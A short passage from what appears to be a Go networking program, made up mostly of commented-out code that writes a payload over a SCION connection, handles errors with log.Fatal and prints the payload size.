//			log.Fatal(err)
//		}
////		_, err = scion_connection1.Write(payload)
////		if err != nil {
////			log.Fatal(err)
////		}
//		//fmt.Println("payload_size: ", payload_size)
//	}
//	return nil
	
	
}
